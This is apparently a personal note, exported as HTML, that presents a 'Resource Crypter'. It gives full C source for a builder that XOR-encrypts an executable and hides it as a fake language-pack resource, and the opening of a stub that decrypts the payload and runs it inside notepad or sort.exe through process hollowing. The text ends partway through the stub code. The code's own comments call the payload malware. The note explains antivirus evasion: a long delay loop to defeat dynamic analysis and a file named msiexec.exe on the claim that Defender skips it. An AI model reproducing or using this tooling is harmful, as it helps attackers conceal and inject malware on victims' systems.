<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Loader -> Attach PE as Resource -> Decrypt -> ProcHollow</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Resource Crypter</h1></strong><br />This is a very basic implementation of a crypter.<br /><br />The executable to encrypt is stored in a loader PE file as a Windows Resource - <a href="https://docs.microsoft.com/en-us/windows/win32/menurc/resources.">https://docs.microsoft.com/en-us/windows/win32/menurc/resources.</a><br />The loader is a decryption program that will load the Resource into memory, decrypt it, and execute it.<br /><br /><a href=""><img src="images/1873-1.png" alt="images/1873-1.png" /></a><br /><br />Here is an example of a binary called <code>msiexec.exe</code> with a Resource attached.<br />It has an ID of 250 and is called <code>LANG</code>.<br />It&#39;s not actually a language pack, it&#39;s an encrypted PE file that will be decrypted and executed.<br /><a href=""><img src="images/1873-2.png" alt="images/1873-2.png" /></a><br /><br /><strong><h2>## Example</h2></strong><br />Here is an example a Resource Crypter.<br />A &quot;Hello, world!&quot; program is stored as a resource in a vessel PE file.<br />Upon execution, the vessel PE file will load the &quot;Hello, world!&quot; program from its resource into memory, decrypt it, and execute in a target process via process hollowing.<br /><br />If the PE is a GUI application, it will inject into <code>Notepad</code><br />If the PE is a Console application, it will inject into <code>sort.exe</code><br /><strong><h3>### Testing</h3></strong><br />I&#39;ve only tested this:<br />•  on <code>Windows 10 2004 19041.630</code><br />•  with x64 binaries (not tried x86)<br /><br /><strong><h3>### AV Bypass</h3></strong><br />To prevent dynamic analysis from anti-virus products, at the start of the program is a loop to 1 billion. This prevents AV from dynamically running our binary because they don&#39;t want to hog the user&#39;s system, so won&#39;t execute this loop and won&#39;t ever see the decrypted file.<br /><br />The technique can be found here on page 10:<br /><a href="https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf">https://wikileaks.org/ciav7p1/cms/files/BypassAVDynamics.pdf</a><br /><br />The final encrypted file is called <code>msiexec.exe</code><br />Apparently Windows Defenders skips scanning files named <code>msiexec.exe</code>:<br /><a href="https://twitter.com/julianpentest/status/1192662369467555841">https://twitter.com/julianpentest/status/1192662369467555841</a><br /><br /><strong><h3>### Encryption</h3></strong><br />The encryption is null-preserving XOR encryption<br />• <code>00</code> isn&#39;t xor&#39;d <br />• equal bytes aren&#39;t xor&#39;ed (e.g. <code>41</code> and <code>41</code>, which will xor to <code>00</code>`)<br /><br /><strong><h3>### Demo</h3></strong><br />- <code>builder</code> - this combines the decryption stub and the executable to encrypt into 1 file<br />- <code>stub</code> - this is the decryption stub<br />- <code>hello_world</code> - this is a demo <code>&quot;Hello, world!&quot;</code> program that can be encrypted for testing<br /><br />1. Create an encrypted file with the builder<br /><code>builder.exe &quot;path/to/stub.exe&quot; &quot;path/to/file/to/crypt.exe&quot;</code><br /><code>builder.exe &quot;C:\Users\Bob\Desktop\stub.exe&quot; &quot;C:\Users\Bob\Desktop\protectme.exe&quot;</code><br /><br />This creates an <code>msiexec.exe</code> file.<br /><a href=""><img src="images/1873-3.png" alt="images/1873-3.png" /></a><br /><br />2. Run the <code>msiexec.exe</code> file<br />The decryption program now loads the &quot;Hello, world!&quot; program from its resource, decrpyts it, and runs it inside of a target process.<br /><br />Here we can see that <code>msiexec.exe</code>:<br />• bypassed AV<br />• loaded the &quot;Hello, world&quot; program from Resource into memory<br />• decrypted it<br />• spawned a <code>sort.exe</code> process, hollowed it out, and executed our decrypted PE inside of it<br /><br />Memory for our decrypted PE was allocated at <code>0x00007FF6D2E80000</code> in the target process <code>sort.exe</code>.<br />With process hacker, at address <code>0x00007FF6D2E80000</code>, we can see our PE file!<br /><a href=""><img src="images/1873-4.png" alt="images/1873-4.png" /></a><br /><br />If we look at the <code>&quot;Hello, world&quot;</code> PE file when it&#39;s as a Resource in <code>msiexec.exe</code>, we can see that it&#39;s completely encrypted.<br /><a href=""><img src="images/1873-5.png" alt="images/1873-5.png" /></a><br /><br /><strong><h2>## Code</h2></strong><br /><strong><h3>### hello_world</h3></strong><br />This is the dummy program that I used for testing.<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />int&nbsp;main(void)<br /><span style="color:#000000;font-weight:400">{</span><br />	MessageBoxA(NULL,&nbsp;&quot;Hello,&nbsp;world!&quot;,&nbsp;&quot;Title&nbsp;:)&quot;,&nbsp;MB_OK);<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h3>### builder</h3></strong><br />Here is the builder, which adds the file to encrypt as a resource to the decryption program.<br /><div class="codebox"><div class="codebox">/*<br />#&nbsp;Builder<br />This&nbsp;builder&nbsp;creates&nbsp;a&nbsp;copy&nbsp;of&nbsp;the&nbsp;stub,&nbsp;XORs&nbsp;the&nbsp;target&nbsp;malware,&nbsp;and&nbsp;adds&nbsp;the&nbsp;malaware&nbsp;to&nbsp;the&nbsp;stub&nbsp;copy&nbsp;as&nbsp;a&nbsp;resource.<br />The&nbsp;stub&nbsp;+&nbsp;malware&nbsp;is&nbsp;saved&nbsp;as&nbsp;1&nbsp;file.<br />*/<br /><br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />/*<br />Make&nbsp;sure&nbsp;to&nbsp;call&nbsp;free(file_buffer)&nbsp;after&nbsp;you&#39;re&nbsp;done.<br />*/<br />LPVOID&nbsp;ReadFileIntoBuffer(char*&nbsp;file_name,&nbsp;OUT&nbsp;DWORD*&nbsp;file_buffer_size)<br />{<br />	LPVOID&nbsp;file_buffer&nbsp;=&nbsp;NULL;<br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;TRUE;<br />	HANDLE&nbsp;h_file&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;file_size&nbsp;=&nbsp;0;<br /><br />	//&nbsp;open&nbsp;target&nbsp;file<br />	h_file&nbsp;=&nbsp;CreateFileA(file_name,&nbsp;GENERIC_READ&nbsp;|&nbsp;GENERIC_WRITE,&nbsp;0,&nbsp;NULL,&nbsp;OPEN_EXISTING,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	if&nbsp;(h_file&nbsp;==&nbsp;INVALID_HANDLE_VALUE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;open&nbsp;target&nbsp;file:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		goto&nbsp;cleanup;<br />	}<br /><br />	//&nbsp;get&nbsp;file&nbsp;size<br />	file_size&nbsp;=&nbsp;GetFileSize(h_file,&nbsp;NULL);<br />	(*file_buffer_size)&nbsp;=&nbsp;file_size;<br /><br />	//&nbsp;create&nbsp;buffer&nbsp;to&nbsp;read&nbsp;file&nbsp;into<br />	file_buffer&nbsp;=&nbsp;malloc(file_size);<br /><br />	//&nbsp;read&nbsp;file&nbsp;into&nbsp;buffer<br />	b_ret&nbsp;=&nbsp;ReadFile(h_file,&nbsp;file_buffer,&nbsp;file_size,&nbsp;NULL,&nbsp;NULL);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;read&nbsp;file&nbsp;into&nbsp;buffer:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		free(file_buffer);<br />		goto&nbsp;cleanup;<br />	}<br /><br />cleanup:<br />	if&nbsp;(h_file)&nbsp;CloseHandle(h_file);<br /><br />	return&nbsp;file_buffer;<br />}<br /><br />WORD&nbsp;GetPEArchitecture(LPVOID&nbsp;image_base)<br />{<br />	WORD&nbsp;architecture&nbsp;=&nbsp;0;<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;NULL;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;NULL;<br /><br />	dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)image_base;<br />	pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)image_base&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br /><br />	//&nbsp;0x10b&nbsp;is&nbsp;32bit<br />	//&nbsp;0x20b&nbsp;is&nbsp;64bit<br />	architecture&nbsp;=&nbsp;pe_header-&gt;OptionalHeader.Magic;<br /><br />	return&nbsp;architecture;<br />}<br /><br />/*<br />NULL&nbsp;preserving&nbsp;XOR.<br />Parameters:<br />	lpBuffer&nbsp;-&nbsp;buffer&nbsp;to&nbsp;XOR<br />	dwBufferSize&nbsp;-&nbsp;size&nbsp;of&nbsp;buffer&nbsp;to&nbsp;XOR<br />Return:<br />	void<br />*/<br />void&nbsp;XOR_buffer(LPVOID&nbsp;buffer,&nbsp;DWORD&nbsp;buf_size)<br />{<br />	char&nbsp;key[]&nbsp;=&nbsp;{&nbsp;&#39;m&#39;,&nbsp;&#39;u&#39;,&nbsp;&#39;c&#39;,&nbsp;&#39;h&#39;,&nbsp;&#39;c&#39;,&nbsp;&#39;r&#39;,&nbsp;&#39;y&#39;,&nbsp;&#39;p&#39;,&nbsp;&#39;t&#39;,&nbsp;&#39;v&#39;,&nbsp;&#39;e&#39;,&nbsp;&#39;r&#39;,&nbsp;&#39;y&#39;,&nbsp;&#39;s&#39;,&nbsp;&#39;e&#39;,&nbsp;&#39;c&#39;,&nbsp;&#39;r&#39;,&nbsp;&#39;e&#39;,&nbsp;&#39;t&#39;&nbsp;};<br />	char*&nbsp;buffer_cpy&nbsp;=&nbsp;(char*)buffer;<br /><br />	DWORD&nbsp;i;<br />	for&nbsp;(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;buf_size;&nbsp;i++)<br />	{<br />		//&nbsp;if&nbsp;byte&nbsp;==&nbsp;00&nbsp;don&#39;t&nbsp;xor&nbsp;(because&nbsp;it&nbsp;shows&nbsp;key)<br />		//&nbsp;or&nbsp;byte&nbsp;is&nbsp;same&nbsp;as&nbsp;key&nbsp;don&#39;t&nbsp;XOR&nbsp;(because&nbsp;will&nbsp;produce&nbsp;00)<br />		if&nbsp;((buffer_cpy[i]&nbsp;==&nbsp;0x00)&nbsp;||&nbsp;(buffer_cpy[i]&nbsp;==&nbsp;key[i&nbsp;%&nbsp;sizeof(key)]))<br />		{<br />			continue;<br />		}<br />		//&nbsp;if&nbsp;byte&nbsp;!=&nbsp;00,&nbsp;XOR&nbsp;it<br />		else<br />		{<br />			buffer_cpy[i]&nbsp;^=&nbsp;key[i&nbsp;%&nbsp;sizeof(key)];<br />		}<br />	}<br /><br />	return;<br />}<br /><br />/*<br />Adds&nbsp;a&nbsp;resource&nbsp;to&nbsp;a&nbsp;PE&nbsp;file&nbsp;with&nbsp;ID:&nbsp;250&nbsp;and&nbsp;Name:&nbsp;LANG<br />*/<br />BOOL&nbsp;AddResource(char*&nbsp;pe_file,&nbsp;LPVOID&nbsp;rsrc_buffer,&nbsp;DWORD&nbsp;rsrc_size)<br />{<br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;TRUE;<br />	BOOL&nbsp;okay&nbsp;=&nbsp;TRUE;<br />	HANDLE&nbsp;h_update&nbsp;=&nbsp;NULL;<br /><br />	//&nbsp;open&nbsp;file<br />	h_update&nbsp;=&nbsp;BeginUpdateResourceA(pe_file,&nbsp;FALSE);<br />	if&nbsp;(h_update&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;start&nbsp;updating&nbsp;PE&nbsp;resources:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;FALSE;<br />	}<br /><br />	//&nbsp;add&nbsp;resource&nbsp;(ID:&nbsp;250.&nbsp;Name:&nbsp;LANG)<br />	b_ret&nbsp;=&nbsp;UpdateResourceA(h_update,&nbsp;MAKEINTRESOURCEA(250),&nbsp;&quot;lang&quot;,&nbsp;LANG_SYSTEM_DEFAULT,&nbsp;rsrc_buffer,&nbsp;rsrc_size);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;add&nbsp;rsource&nbsp;to&nbsp;PE:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;FALSE;<br />	}<br /><br />	//&nbsp;save&nbsp;changes<br />	b_ret&nbsp;=&nbsp;EndUpdateResourceA(h_update,&nbsp;FALSE);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;save&nbsp;resource&nbsp;changes&nbsp;to&nbsp;PE:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;FALSE;<br />	}<br /><br />	return&nbsp;okay;<br />}<br /><br />int&nbsp;main(int&nbsp;argc,&nbsp;char*&nbsp;argv[])<br /><span style="color:#000000;font-weight:400">{</span><br />	printf(&quot;#&nbsp;builder&nbsp;\n&quot;);<br />	printf(&quot;-&nbsp;takes&nbsp;a&nbsp;stub.exe&nbsp;and&nbsp;packs&nbsp;your&nbsp;PE&nbsp;into&nbsp;it&nbsp;as&nbsp;a&nbsp;resource&nbsp;\n\n&quot;);<br /><br />	if&nbsp;(argc&nbsp;!=&nbsp;3)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;not&nbsp;enough&nbsp;arguments&nbsp;:/&nbsp;\n&quot;);<br />		printf(&quot;usage:&nbsp;builder.exe&nbsp;[path/to/stub.exe]&nbsp;[path/to/exe/to/crypt.exe]&nbsp;\n&quot;);<br />		return&nbsp;EXIT_FAILURE;<br />	}<br /><br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;FALSE;<br />	char*&nbsp;stub_path&nbsp;=&nbsp;argv[1];<br />	char*&nbsp;exe_path&nbsp;=&nbsp;argv[2];<br />	LPVOID&nbsp;exe_buffer&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;exe_size&nbsp;=&nbsp;0;<br />	LPVOID&nbsp;stub_buffer&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;stub_size&nbsp;=&nbsp;0;<br />	WORD&nbsp;stub_architecture&nbsp;=&nbsp;0;<br />	WORD&nbsp;exe_architecture&nbsp;=&nbsp;0;<br /><br />	//&nbsp;read&nbsp;executable&nbsp;to&nbsp;crypt&nbsp;and&nbsp;stub&nbsp;into&nbsp;memory<br />	printf(&quot;[+]&nbsp;stub:&nbsp;\&quot;%s\&quot;&nbsp;\n&quot;,&nbsp;stub_path);<br />	printf(&quot;[+]&nbsp;exe:&nbsp;\&quot;%s\&quot;&nbsp;\n\n&quot;,&nbsp;exe_path);<br /><br />	exe_buffer&nbsp;=&nbsp;ReadFileIntoBuffer(exe_path,&nbsp;&amp;exe_size);<br />	if&nbsp;(exe_buffer&nbsp;==&nbsp;NULL)<br />		return&nbsp;EXIT_FAILURE;<br />	printf(&quot;[+]&nbsp;exe&nbsp;read&nbsp;into&nbsp;memory&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;exe_buffer);<br /><br />	stub_buffer&nbsp;=&nbsp;ReadFileIntoBuffer(stub_path,&nbsp;&amp;stub_size);<br />	if&nbsp;(stub_buffer&nbsp;==&nbsp;NULL)<br />		return&nbsp;EXIT_FAILURE;<br />	printf(&quot;[+]&nbsp;stub&nbsp;read&nbsp;into&nbsp;memory&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;stub_buffer);<br /><br />	//&nbsp;check&nbsp;that&nbsp;architecture&nbsp;of&nbsp;stub&nbsp;&amp;&nbsp;exectuable&nbsp;match<br />	stub_architecture&nbsp;=&nbsp;GetPEArchitecture(stub_buffer);<br />	exe_architecture&nbsp;=&nbsp;GetPEArchitecture(exe_buffer);<br /><br />#ifdef&nbsp;_WIN64<br />	if&nbsp;(stub_architecture&nbsp;!=&nbsp;0x20b)<br />	{<br />		printf(&quot;[!]&nbsp;64bit&nbsp;stub&nbsp;required&nbsp;\n\t&nbsp;%s&nbsp;is&nbsp;not&nbsp;64bit&nbsp;\n&quot;,&nbsp;stub_path);<br />		return&nbsp;EXIT_FAILURE;<br />	}<br />	else&nbsp;if&nbsp;(exe_architecture&nbsp;!=&nbsp;0x20b)<br />	{<br />		printf(&quot;[!]&nbsp;64bit&nbsp;PE&nbsp;required&nbsp;\n\t&nbsp;%s&nbsp;is&nbsp;not&nbsp;64bit&nbsp;\n&quot;,&nbsp;exe_path);<br />		return&nbsp;EXIT_FAILURE;<br />	}<br />#else<br />	if&nbsp;(stub_architecture&nbsp;!=&nbsp;0x10b)<br />	{<br />		printf(&quot;[!]&nbsp;32bit&nbsp;stub&nbsp;required&nbsp;\n\t&nbsp;%s&nbsp;is&nbsp;not&nbsp;32bit&nbsp;\n&quot;,&nbsp;stub_path);<br />		return&nbsp;EXIT_FAILURE;<br />	}<br />	else&nbsp;if&nbsp;(exe_architecture&nbsp;!=&nbsp;0x10b)<br />	{<br />		printf(&quot;[!]&nbsp;32bit&nbsp;PE&nbsp;required&nbsp;\n\t&nbsp;%s&nbsp;is&nbsp;not&nbsp;32bit&nbsp;\n&quot;,&nbsp;exe_path);<br />		return&nbsp;EXIT_FAILURE;<br />	}<br />#endif<br /><br />	//&nbsp;XOR&nbsp;encrypt&nbsp;executable<br />	printf(&quot;[+]&nbsp;encrypting&nbsp;.exe...&nbsp;&quot;);<br />	XOR_buffer(exe_buffer,&nbsp;exe_size);<br />	printf(&quot;done!&nbsp;\n&quot;);<br /><br />#ifdef&nbsp;_DEBUG<br />	char&nbsp;filename[]&nbsp;=&nbsp;&quot;encrypted.bin&quot;;<br />	HANDLE&nbsp;h_file&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;bytes_written&nbsp;=&nbsp;0;<br /><br />	h_file&nbsp;=&nbsp;CreateFileA(filename,&nbsp;GENERIC_ALL,&nbsp;0,&nbsp;NULL,&nbsp;CREATE_ALWAYS,&nbsp;FILE_ATTRIBUTE_NORMAL,&nbsp;NULL);<br />	WriteFile(h_file,&nbsp;exe_buffer,&nbsp;exe_size,&nbsp;&amp;bytes_written,&nbsp;NULL);<br />	CloseHandle(h_file);<br />	printf(&quot;[debug]&nbsp;XOR&#39;d&nbsp;%s&nbsp;created&nbsp;\n&quot;,&nbsp;filename);<br />#endif<br /><br />	//&nbsp;make&nbsp;copy&nbsp;of&nbsp;stub&nbsp;&amp;&nbsp;save&nbsp;as&nbsp;`msiexec.exe`<br />	//&nbsp;msiexec.exe&nbsp;is&nbsp;excluded&nbsp;from&nbsp;Windows&nbsp;Defender&nbsp;realtime&nbsp;scanning&nbsp;-&nbsp;https://twitter.com/0gtweet/status/1194627280695250944<br />	char&nbsp;final_file[MAX_PATH]&nbsp;=&nbsp;&quot;.\\msiexec.exe&quot;;<br />	printf(&quot;[+]&nbsp;creating&nbsp;crypted&nbsp;file:&nbsp;\&quot;%s\&quot;&nbsp;\n&quot;,&nbsp;final_file);<br /><br />	b_ret&nbsp;=&nbsp;CopyFileA(stub_path,&nbsp;final_file,&nbsp;FALSE);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;copy&nbsp;of&nbsp;stub:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		return&nbsp;EXIT_FAILURE;<br />	}<br /><br />	//&nbsp;add&nbsp;encrypted&nbsp;executable&nbsp;to&nbsp;stub&nbsp;as&nbsp;a&nbsp;resource<br />	b_ret&nbsp;=&nbsp;AddResource(final_file,&nbsp;exe_buffer,&nbsp;exe_size);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		fprintf(stderr,&nbsp;&quot;[-]&nbsp;failed&nbsp;to&nbsp;add&nbsp;resource&nbsp;to&nbsp;%s:&nbsp;%d&nbsp;\n&quot;,&nbsp;final_file,&nbsp;GetLastError());<br />		return&nbsp;EXIT_FAILURE;<br />	}<br />	printf(&quot;[+]&nbsp;successfully&nbsp;added&nbsp;\&quot;%s\&quot;&nbsp;as&nbsp;a&nbsp;resource&nbsp;to&nbsp;the&nbsp;stub!&nbsp;\n&quot;,&nbsp;exe_path);<br />	printf(&quot;[+]&nbsp;complete!&nbsp;\n&quot;);<br />	printf(&quot;[*]&nbsp;crypted&nbsp;file&nbsp;now&nbsp;ready&nbsp;at&nbsp;:&nbsp;\&quot;%s\&quot;&nbsp;\n&quot;,&nbsp;final_file);<br /><br />	//&nbsp;clean&nbsp;up<br />	free(exe_buffer);<br />	free(stub_buffer);<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><strong><h3>### stub</h3></strong><br />This is the decryption program that stores the PE file as a resource , decrypts it, and executes it.<br />Most of the code in here is actually process hollowing code. Executng the PE file from memory can be done any way you like.<br /><div class="codebox"><div class="codebox">/*<br />#&nbsp;Stub<br />This&nbsp;stub&nbsp;loads&nbsp;an&nbsp;executable&nbsp;from&nbsp;the&nbsp;PE&nbsp;resources&nbsp;into&nbsp;memory,&nbsp;decrypts&nbsp;it,&nbsp;loads&nbsp;it&nbsp;into&nbsp;a&nbsp;target&nbsp;process&#39;&nbsp;memory&nbsp;via&nbsp;process&nbsp;hollowing&nbsp;and&nbsp;executes&nbsp;it.<br /><br />File&nbsp;can&nbsp;be&nbsp;compiled&nbsp;as&nbsp;32bit&nbsp;or&nbsp;64bit.<br />	-&nbsp;32bit&nbsp;stub&nbsp;is&nbsp;for&nbsp;loading&nbsp;32bit&nbsp;PEs<br />	-&nbsp;64bit&nbsp;stub&nbsp;is&nbsp;for&nbsp;loading&nbsp;64bit&nbsp;PEs<br />*/<br /><br />#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br />#include&nbsp;&lt;winternl.h&gt;<br /><br />typedef&nbsp;struct&nbsp;BASE_RELOCATION_ENTRY<br />{<br />	USHORT&nbsp;Offset&nbsp;:&nbsp;12;<br />	USHORT&nbsp;Type&nbsp;:&nbsp;4;<br />}&nbsp;BASE_RELOCATION_ENTRY,&nbsp;*&nbsp;PBASE_RELOCATION_ENTRY;<br /><br />typedef&nbsp;NTSTATUS(__stdcall*&nbsp;t_NtUnmapViewOfSection)(HANDLE&nbsp;Processhandle,&nbsp;PVOID&nbsp;BaseAddress);<br />t_NtUnmapViewOfSection&nbsp;d_NtUnmapViewOfSection;<br /><br />/*<br />Prevent&nbsp;automated&nbsp;dynamic&nbsp;analysis&nbsp;by&nbsp;AV&nbsp;(which&nbsp;will&nbsp;run&nbsp;the&nbsp;start&nbsp;of&nbsp;this&nbsp;.exe)&nbsp;from&nbsp;seeing&nbsp;the&nbsp;decrypted&nbsp;resource.<br />AV&nbsp;doesn&#39;t&nbsp;want&nbsp;to&nbsp;execute&nbsp;a&nbsp;massive&nbsp;loop&nbsp;this&nbsp;and&nbsp;hog&nbsp;the&nbsp;user&#39;s&nbsp;system,&nbsp;so&nbsp;it&nbsp;will&nbsp;never&nbsp;reach&nbsp;the&nbsp;decryption&nbsp;stage&nbsp;and&nbsp;see&nbsp;the&nbsp;decrypted&nbsp;PE.<br />*/<br />void&nbsp;BypassAV()<br />{<br />	DWORD&nbsp;count&nbsp;=&nbsp;1000000000;<br />	for&nbsp;(DWORD&nbsp;i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;count;&nbsp;i++)<br />		continue;<br /><br />	return;<br />}<br /><br />LPVOID&nbsp;ExtractResource(OUT&nbsp;DWORD*&nbsp;rsrc_size)<br />{<br />	HANDLE&nbsp;h_module&nbsp;=&nbsp;NULL;<br />	HANDLE&nbsp;h_resinfo&nbsp;=&nbsp;NULL;<br />	HANDLE&nbsp;h_resource&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;resource_size&nbsp;=&nbsp;0;<br />	LPVOID&nbsp;rsrc_buffer&nbsp;=&nbsp;NULL;<br />	DWORD&nbsp;old_protect&nbsp;=&nbsp;0;<br /><br />	//&nbsp;load&nbsp;resource<br />	h_module&nbsp;=&nbsp;GetModuleHandleW(NULL);<br />	h_resinfo&nbsp;=&nbsp;FindResourceW(h_module,&nbsp;L&quot;LANG&quot;,&nbsp;MAKEINTRESOURCEW(250));<br />	h_resource&nbsp;=&nbsp;LoadResource(h_module,&nbsp;h_resinfo);<br /><br />	//&nbsp;grab&nbsp;size<br />	resource_size&nbsp;=&nbsp;SizeofResource(h_module,&nbsp;h_resinfo);<br />	*rsrc_size&nbsp;=&nbsp;resource_size;<br /><br />	//&nbsp;allocate&nbsp;memory&nbsp;for&nbsp;resource<br />	//unsigned&nbsp;char*&nbsp;lpRsrcBuffer&nbsp;=&nbsp;HeapAlloc(GetProcessHeap(),&nbsp;0,&nbsp;dwRsrcSize);<br />	rsrc_buffer&nbsp;=&nbsp;VirtualAlloc(NULL,&nbsp;resource_size,&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_EXECUTE_READWRITE);<br /><br />	//&nbsp;load&nbsp;resource&nbsp;into&nbsp;memory<br />	rsrc_buffer&nbsp;=&nbsp;LockResource(h_resource);<br /><br />	//&nbsp;set&nbsp;RWX&nbsp;persmissions&nbsp;on&nbsp;memory<br />	VirtualProtect(rsrc_buffer,&nbsp;resource_size,&nbsp;PAGE_EXECUTE_READWRITE,&nbsp;&amp;old_protect);<br /><br />	return&nbsp;rsrc_buffer;<br />}<br /><br />void&nbsp;XOR_buffer(LPVOID&nbsp;buffer,&nbsp;DWORD&nbsp;buf_size)<br />{<br />	char&nbsp;key[]&nbsp;=&nbsp;{&nbsp;&#39;m&#39;,&nbsp;&#39;u&#39;,&nbsp;&#39;c&#39;,&nbsp;&#39;h&#39;,&nbsp;&#39;c&#39;,&nbsp;&#39;r&#39;,&nbsp;&#39;y&#39;,&nbsp;&#39;p&#39;,&nbsp;&#39;t&#39;,&nbsp;&#39;v&#39;,&nbsp;&#39;e&#39;,&nbsp;&#39;r&#39;,&nbsp;&#39;y&#39;,&nbsp;&#39;s&#39;,&nbsp;&#39;e&#39;,&nbsp;&#39;c&#39;,&nbsp;&#39;r&#39;,&nbsp;&#39;e&#39;,&nbsp;&#39;t&#39;&nbsp;};<br />	char*&nbsp;buffer_cpy&nbsp;=&nbsp;(char*)buffer;<br /><br />	DWORD&nbsp;i;<br />	for&nbsp;(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;buf_size;&nbsp;i++)<br />	{<br />		//&nbsp;if&nbsp;byte&nbsp;==&nbsp;00&nbsp;don&#39;t&nbsp;xor&nbsp;(because&nbsp;it&nbsp;shows&nbsp;key)<br />		//&nbsp;or&nbsp;byte&nbsp;is&nbsp;same&nbsp;as&nbsp;key&nbsp;don&#39;t&nbsp;XOR&nbsp;(because&nbsp;will&nbsp;produce&nbsp;00)<br />		if&nbsp;((buffer_cpy[i]&nbsp;==&nbsp;0x00)&nbsp;||&nbsp;(buffer_cpy[i]&nbsp;==&nbsp;key[i&nbsp;%&nbsp;sizeof(key)]))<br />		{<br />			continue;<br />		}<br />		//&nbsp;if&nbsp;byte&nbsp;!=&nbsp;00,&nbsp;XOR&nbsp;it<br />		else<br />		{<br />			buffer_cpy[i]&nbsp;^=&nbsp;key[i&nbsp;%&nbsp;sizeof(key)];<br />		}<br />	}<br /><br />	return;<br />}<br /><br />WORD&nbsp;GetSubsystem(LPVOID&nbsp;image_buffer)<br />{<br />	WORD&nbsp;subsystem&nbsp;=&nbsp;0;<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;NULL;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;NULL;<br /><br />	dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)image_buffer;<br />	pe_header&nbsp;=&nbsp;(PIMAGE_NT_HEADERS)((DWORD_PTR)image_buffer&nbsp;+&nbsp;dos_header-&gt;e_lfanew);<br /><br />	//&nbsp;GUI&nbsp;is&nbsp;2<br />	//&nbsp;Console&nbsp;is&nbsp;3<br />	subsystem&nbsp;=&nbsp;pe_header-&gt;OptionalHeader.Subsystem;<br /><br />	return&nbsp;subsystem;<br />}<br /><br />/*<br />Convert&nbsp;VirtualAddress&nbsp;(address&nbsp;in&nbsp;memory)&nbsp;to&nbsp;raw&nbsp;address&nbsp;(address&nbsp;on&nbsp;disk).<br />Does&nbsp;so&nbsp;by&nbsp;finding&nbsp;which&nbsp;PE&nbsp;section&nbsp;your&nbsp;VirtualAddress&nbsp;is&nbsp;in,<br />subtracting&nbsp;the&nbsp;section&#39;s&nbsp;start&nbsp;address&nbsp;to&nbsp;find&nbsp;the&nbsp;relative&nbsp;virtual&nbsp;address,<br />and&nbsp;then&nbsp;adding&nbsp;the&nbsp;RVA&nbsp;to&nbsp;the&nbsp;start&nbsp;of&nbsp;the&nbsp;section&nbsp;on&nbsp;disk.<br />*/<br />DWORD&nbsp;va2raw(LPVOID&nbsp;file_buffer,&nbsp;DWORD&nbsp;va)<br />{<br />	DWORD&nbsp;rva&nbsp;=&nbsp;0;<br />	DWORD&nbsp;raw_address&nbsp;=&nbsp;0;<br />	PIMAGE_DOS_HEADER&nbsp;dos_header&nbsp;=&nbsp;NULL;<br />	PIMAGE_NT_HEADERS&nbsp;pe_header&nbsp;=&nbsp;NULL;<br />	PIMAGE_SECTION_HEADER&nbsp;section_header&nbsp;=&nbsp;NULL;<br /><br />	//&nbsp;grab&nbsp;section&nbsp;header<br />	dos_header&nbsp;=&nbsp;(PIMAGE_DOS_HEADER)file_buffer;<br />	